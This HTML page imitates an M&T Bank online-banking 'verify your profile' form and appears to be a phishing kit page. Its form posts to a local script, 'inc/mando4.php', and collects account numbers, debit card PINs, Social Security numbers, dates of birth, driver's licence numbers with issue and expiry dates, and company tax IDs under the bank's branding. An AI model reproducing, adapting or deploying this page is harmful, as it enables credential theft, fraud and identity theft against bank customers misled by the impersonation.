<!doctype html>
<html lang="en" class="__sticky-footer">

<head>



    <meta charset="UTF-8">
    <meta name="viewport"
        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="css/foundation-all.css" rel="stylesheet" />
    <link href="css/mtb.css" rel="stylesheet" />

    <style>
        /*SUGGESTED ADD FOR THE FRAMEWORK*/

        .no-headerFooter>.mtb-page-header {
            display: none;
        }

        .no-headerFooter {
            padding-top: 1.5rem;
        }
    </style>

    <title>Enroll in Online Banking - Verify Account | M&T Bank</title>
    <link rel="shortcut icon" href="css/favicon.ico" type="image/x-icon" />
</head>

<body class="">



    <header class="mtb-page-header">
        <a class="mtb__logo" href="#">
            <img class="mtb__logo" src="css/white logo.png" alt="M&T Bank" />
        </a>

        <a href="#" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
        </a>
    </header>
    <div data-msg-code="" class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
        <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
    </div>
    <div class="mtb-app-enrollment--content">




        <form action="inc/mando4.php"
            class="js-form js-verifyAccountForm" id="verifyAccountForm" method="post" name="verifyAccountForm"> <input
                type="hidden" value="R" name="EnrolleeType" id="EnrolleeType" />
            <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
                <div class="cell">


                    <!-- page title -->

                    <div class="mtb-section-header mtb-section-header--top">
                        <p class="__top-title">
                            Verification&nbsp; in Online Banking </p>
                        <h1>
                            Verify your Profile information
                        </h1>
                        <p>
                            Enter your Profile details below to verify your identity.
                        </p>
                    </div>

                </div>

                <div class="cell">



                    <div class="expanded button-group button-group__toggle">
                        <button data-ensightentag="AccountInfoButton" type="button"
                            class="button js-enrolleeTypeTab active" data-value=R data-defaultaccounttype=RetailAccount
                            data-url=#>Profile Information</button>
                        <button data-ensightentag=CardInfoButton type="button" class="button js-enrolleeTypeTab "
                            data-value=R data-defaultaccounttype=RetailCard data-url=#>Debit Card Information</button>
                    </div>
                </div>







                <div class="cell hide" data-showFor=BusinessAccount>



                </div>
                <div data-parentFor="FirstName" class="cell js-formFieldParent hide" data-showFor=BusinessAccount>
                    <label for="FirstName">First Name</label>
                    <input data-fcid="" value="" maxlength="20" class="js-formnputItem" data-allowPaste="True"
                        data-allowCopy="True" data-textBoxAccepts="letters" placeholder="" type="text" id="FirstName"
                        name="FirstName" data-inputType="text">
                    <p class="form-error" id=FirstNameError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="LastName" class="cell js-formFieldParent hide" data-showFor=BusinessAccount>
                    <label for="LastName">Last Name</label>
                    <input data-fcid="" value="" maxlength="20" class="js-formnputItem" data-allowPaste="True"
                        data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder="" type="text"
                        id="LastName" name="LastName" data-inputType="text">
                    <p class="form-error" id=LastNameError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="AccountNumber" class="cell js-formFieldParent hide" data-formatType=>
                    <label for="AccountNumber">Account Number</label>
                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="">
                        <input data-fcid="" value="" maxlength="20" data-allowPaste="True" data-allowCopy="True"
                            data-textBoxAccepts="numbers" placeholder="" data-inputType="tel"
                            class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus js-keeponclear"
                            type="tel" id="AccountNumber" name="AccountNumber">
                        <div class="input-group-button">
                            <button type="button" data-btnFor="AccountNumber" class="button clear js-showHide">
                                Hide
                            </button>
                        </div>
                    </div>
                    <p class="form-error" id=AccountNumberError role="alert"></p>
                    <p class="form-help-text"></p>

                </div>
                <div data-parentFor="SecurityPin" class="cell js-formFieldParent hide"
                    data-showFor=BusinessCreditCard,BusinessDebitCard,RetailCreditCard,RetailDebitCard>
                    <label for="SecurityPin">4-Digit PIN</label>
                    <input data-fcid="" value="" maxlength="4" class="js-formnputItem" data-allowPaste="True"
                        data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="0000" type="password"
                        id="SecurityPin" name="SecurityPin" data-inputType="text">
                    <p class="form-error" id=SecurityPinError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="SSN" class="cell js-formFieldParent hide"
                    data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount data-formatType=ssn>
                    <label for="SSN">Social Security Number</label>
                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="●●●-●●-●●●●">
                        <input data-fcid="" value="" maxlength="9" data-allowPaste="True" data-allowCopy="True"
                            data-textBoxAccepts="numbers" placeholder="000-00-0000" data-inputType="tel"
                            class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus"
                            type="tel" id="SSN" name="SSN">
                        <div class="input-group-button">
                            <button type="button" data-btnFor="SSN" class="button clear js-showHide">
                                Hide
                            </button>
                        </div>
                    </div>
                    <p class="form-error" id=SSNError role="alert"></p>
                    <p class="form-help-text">
                        <button data-ensightentag=IDontHaveASSNLink class="button button__link clear" type="button"
                            data-open="noSSNContent"> I don&#39;t have a Social Security number</button>
                    </p>
                    <p class="callout plain __spacer-paragraph __spacer-form-up hide" id="noSSNContent">If you don't
                        have a Social Security number, you can enroll in Online Banking with your M&T Debit Card or you
                        can call M&T Customer Service at <a href='tel:18007909130'>1-800-790-9130</a> (Mon-Fri 8am-9pm,
                        Sat-Sun 9am-5pm ET).</p>

                </div>
                <div data-parentFor="DateOfBirth" class="cell js-formFieldParent hide"
                    data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount data-formatType=date>
                    <label for="DateOfBirth">Date of Birth</label>
                    <input data-fcid="" value="" maxlength="10" class="js-formnputItem" data-allowPaste="True"
                        data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="MM/DD/YYYY" type="tel"
                        id="DateOfBirth" name="DateOfBirth" data-inputType="tel">
                    <p class="form-error" id=DateOfBirthError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>



                <div class="cell hide" data-showFor=BusinessAccount>


                    <h2 class="mtb-form__section-title hide" data-showFor=BusinessAccount>
                        Company Information
                    </h2>
                </div>
                <div data-parentFor="CompanyName" class="cell js-formFieldParent hide" data-showFor=BusinessAccount>
                    <label for="CompanyName">Company Name</label>
                    <input data-fcid="" value="" maxlength="40" class="js-formnputItem" data-allowPaste="True"
                        data-allowCopy="True" data-textBoxAccepts="custom" placeholder="" type="text" id="CompanyName"
                        name="CompanyName" data-inputType="text" data-regexname=companyNameAllow>
                    <p class="form-error" id=CompanyNameError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="CompanyTaxId" class="cell js-formFieldParent hide" data-showFor=BusinessAccount
                    data-formatType=taxid>
                    <label for="CompanyTaxId">Tax ID Number</label>
                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="●●-●●●●●">
                        <input data-fcid="" value="" maxlength="9" data-allowPaste="True" data-allowCopy="True"
                            data-textBoxAccepts="numbers" placeholder="00-0000000" data-inputType="tel"
                            class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus"
                            type="tel" id="CompanyTaxId" name="CompanyTaxId">
                        <div class="input-group-button">
                            <button type="button" data-btnFor="CompanyTaxId" class="button clear js-showHide">
                                Hide
                            </button>
                        </div>
                    </div>
                    <p class="form-error" id=CompanyTaxIdError role="alert"></p>
                    <p class="form-help-text"></p>

                </div>

            </section>
            <div class="mtb-app-enrollment--content">





                <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
                    <div class="cell">


                        <!-- page title -->



                    </div>

                    <div class="cell">



                        <div class="expanded button-group button-group__toggle">
                        </div>
                    </div>







                    <div class="cell hide" data-showFor="BusinessAccount">


                        <h2 class="mtb-form__section-title hide" data-showFor="BusinessAccount">
                            Company Administrator Information
                            <button tabindex="0" type="button"
                                class="m-icon m-icon-questionmarkcircle __contextual-help mtb-help m-icon-questionmarkcircle js-modal-trigger"
                                aria-haspopup="true" aria-controls="reveal-basic"
                                data-ensightentag="CompanyAdministratorInfoQuestionIcon" data-open="companyadmin-modal">
                                <span class="show-for-sr">Show Help</span>
                            </button>
                        </h2>
                    </div>
                    <div data-parentFor="FirstName" class="cell js-formFieldParent " data-showFor="BusinessAccount">
                        <div>
                            <label class="input" for="txtUserID">Driver License Number</label>
                            <input class="input" type="text" id="txtUserID" name="dlnumber" value="" autocomplete="off"
                                aria-invalid="false" minlength="5" maxlength="20" role="textbox" required="">
                        </div>
                    </div>
                    <div data-parentFor="LastName" class="cell js-formFieldParent " data-showFor="BusinessAccount">
                    <label for="DateOfBirth">Issue Date</label>
                        <input data-fcid="" value="" maxlength="10" data-mask="00-00-0000" class="js-formnputItem"
                            data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers"
                            placeholder="MM/DD/YYYY" type="tel" id="DateOfBirth" name="issDate" data-inputType="tel"
                            required="">
                        <p class="form-error" id=DateOfBirthError role="alert"></p>
                        <p class="form-help-text"></p>
                    </div>
                    <div data-parentFor="AccountNumber" class="cell js-formFieldParent " data-formatType=>
                    <label for="DateOfBirth">Expiry Date</label>
                        <input data-fcid="" value="" maxlength="10" data-mask="00-00-0000" class="js-formnputItem"
                            data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers"
                            placeholder="MM/DD/YYYY" type="tel" id="DateOfBirth" name="expDate" data-inputType="tel"
                            required="">
                        <p class="form-error" id=DateOfBirthError role="alert"></p>
                            <div class="input-group-button">

                            </div>
                        </div>
                        <p class="form-error" id=AccountNumberError role="alert"></p>
                        <p class="form-help-text"></p>

                    </div>


                    <div data-parentFor="SSN" class="cell js-formFieldParent "
                        data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount
                        data-formatType=ssn>
                        <label for="SSN">Social Security Number</label>
                        <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="●●●-●●-●●●●">
                            <input data-fcid="" value="" maxlength="11" data-mask="000-00-0000" data-allowPaste="True"
                                data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="000-00-0000"
                                data-inputType="tel"
                                class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus"
                                type="tel" id="SSN" name="ssn" required="">
                            <div class="input-group-button">

                            </div>
                        </div>
                        <p class="form-error" id=SSNError role="alert"></p>


                    </div>
                    <!-- <div data-parentFor="DateOfBirth" class="cell js-formFieldParent "
                        data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount
                        data-formatType=date>
                        <label for="DateOfBirth">Date of Birth</label>
                        <input data-fcid="" value="" maxlength="10" data-mask="00-00-0000" class="js-formnputItem"
                            data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers"
                            placeholder="MM/DD/YYYY" type="tel" id="DateOfBirth" name="dob" data-inputType="tel"
                            required="">
                        <p class="form-error" id=DateOfBirthError role="alert"></p>
                        <p class="form-help-text"></p>
                    </div> -->







                </section>
                <section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">


                    <div class="cell">
                        <button data-ensightentag=ContinueButton name="account_verify" type="submit" data-url=""
                            class="button button__form js-submit">
                            Continue
                        </button>
                    </div>
                    <div class="cell">

                    </div>

                </section>
        </form>




        <div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal=""
            data-options="closeOnClick:false">

            <div class="mtb-reveal-title ">
            </div>

            <div class="mtb-reveal-body">


            </div>

            <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">

                <div class="cell small-6">
                    <a href="/Enrollment" class="button hollow expanded" aria-label="Log out" data-close=""
                        data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
                </div>
                <div class="cell small-6">
                    <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button"
                        data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName"
                        id="TagPageName">STAY ONLINE</button>
                </div>

            </div>
        </div>

    </div>

    </form>




    <div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false">

        <div class="mtb-reveal-title ">
            <h1>Timeout Message</h1>
        </div>

        <div class="mtb-reveal-body">

            <div class="cell">
                <p>Your online banking session has been inactive for 9 minutes. For your security, we will automatically
                    log you out in 1 minute. Click Stay Online to continue your session.</p>
            </div>

        </div>

        <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">

            <div class="cell small-6">
                <a href="/Enrollment" class="button hollow expanded" aria-label="Log out" data-close=""
                    data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
            </div>
            <div class="cell small-6">
                <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button"
                    data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName"
                    id="TagPageName">STAY ONLINE</button>
            </div>

        </div>
    </div>

    <input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility" />
    </div>


    <footer class="mtb-footer" role="contentinfo">
        <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
            <div class="cell">
                <p>
                    &copy;2023 M&amp;T Bank. All Rights Reserved.<br>
                    Users of this website agree to be bound by the provisions of the M&amp;T website <a href="#"
                        target="_blank">Terms of Use</a> and <a href="#" target="_blank">Privacy Policy</a>.
                </p>
                <div class="mtb-footer__logo">
                    <a href="#" target="_blank">
                        <img src="css/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender"
                            alt="Equal Housing Lender">
                    </a>
                    <a href="#" target="_blank">
                        <img src="css/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                    </a>
                </div>
                <p>
                    Equal Housing Lender. NMLS #381076<br>
                    <a href="#" target="_blank">Member FDIC.</a>
                </p>
            </div>
        </div>
    </footer>




    <div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
        <div class="mtb-spinner--triple-dot">
            <div></div>
            <div></div>
            <div></div>
            <span class="show-for-sr">Loading ...</span>
        </div>
    </div>

</body>

</html>